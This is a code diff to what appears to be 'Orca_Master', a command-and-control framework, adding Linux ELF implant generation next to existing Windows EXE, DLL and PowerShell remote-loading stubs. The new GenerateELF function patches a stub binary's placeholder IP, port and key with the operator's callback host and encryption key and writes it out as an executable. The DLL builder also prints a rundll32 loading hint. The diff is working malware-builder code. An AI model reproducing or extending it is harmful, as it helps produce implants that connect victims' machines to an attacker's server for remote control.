@@ -3,6 +3,7 @@ package generateopt
 import (
 	"Orca_Master/cli/cmdopt/fileopt"
 	"Orca_Master/cli/common"
+	"Orca_Master/define/api"
 	"Orca_Master/define/colorcode"
 	"Orca_Master/define/config"
 	"Orca_Master/define/retcode"
@@ -25,7 +26,11 @@ var winType = []string{
 	//"xsl",
 }
 
-type buildFunc func(stubData []byte, host, proto, target, outputPath string)
+var lnxType = []string{
+	"elf",
+}
+
+type buildFunc func(stubData []byte, host, proto, target, key, outputPath string)
 
 var BuildMap = make(map[string]buildFunc)
 
@@ -33,6 +38,7 @@ func InitBuildMap() {
 	BuildMap["exe"] = GenerateExe
 	BuildMap["dll"] = GenerateDLL
 	BuildMap["ps1"] = GeneratePs1
+	BuildMap["elf"] = GenerateELF
 }
 
 func IsWinType(fileType string) bool {
@@ -44,9 +50,18 @@ func IsWinType(fileType string) bool {
 	}
 	return flag
 }
+func IsLnxType(fileType string) bool {
+	flag := false
+	for _, t := range lnxType {
+		if fileType == t {
+			flag = true
+		}
+	}
+	return flag
+}
 
 // powershell远程加载
-func GeneratePs1(stubData []byte, host, proto, target, outputPath string) {
+func GeneratePs1(stubData []byte, host, proto, target, key, outputPath string) {
 	stubStr := `
 Set-StrictMode -Version 2
 
@@ -131,7 +146,7 @@ If ([IntPtr]::size -eq 8) {
 }
 
 // c-exe远程加载
-func GenerateExe(stubData []byte, host, proto, target, outputPath string) {
+func GenerateExe(stubData []byte, host, proto, target, key, outputPath string) {
 	if outputPath[len(outputPath)-3:] != "exe" {
 		outputPath += ".exe"
 	}
@@ -161,7 +176,7 @@ func GenerateExe(stubData []byte, host, proto, target, outputPath string) {
 }
 
 // c-dll远程加载
-func GenerateDLL(stubData []byte, host, proto, target, outputPath string) {
+func GenerateDLL(stubData []byte, host, proto, target, key, outputPath string) {
 	if outputPath[len(outputPath)-3:] != "dll" {
 		outputPath += ".dll"
 	}
@@ -189,5 +204,28 @@ func GenerateDLL(stubData []byte, host, proto, target, outputPath string) {
 	message := fmt.Sprintf("%s build successfully!", absOutputPath)
 	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
 	message = fmt.Sprintf("you can use [rundll32.exe %s,main] to load", absOutputPath)
+	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
+}
+
+func GenerateELF(stubData []byte, host, proto, target, key, outputPath string) {
+	sIP := "4294967295"
+	sPort := ":65535"
+	iIP, iPort, _ := strings.Cut(host, ":")
+	nIP := api.IpAddrToInt(iIP)
+	nPort, _ := strconv.Atoi(iPort)
+	dIP := fmt.Sprintf("%010d", nIP)
+	dPort := fmt.Sprintf(":%05d", nPort)
+	sKey := "Adba723b4fe06819"
+	stubData = ReplaceBytes(stubData, []byte(sIP), []byte(dIP))
+	stubData = ReplaceBytes(stubData, []byte(sPort), []byte(dPort))
+	stubData = ReplaceBytes(stubData, []byte(sKey), []byte(key))
+	err := ioutil.WriteFile(outputPath, stubData, 0777)
+	if err != nil {
+		message := fmt.Sprintf("%s", err.Error())
+		colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
+		return
+	}
+	absOutputPath, _ := filepath.Abs(outputPath)
+	message := fmt.Sprintf("%s build successfully!", absOutputPath)
 	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
 }
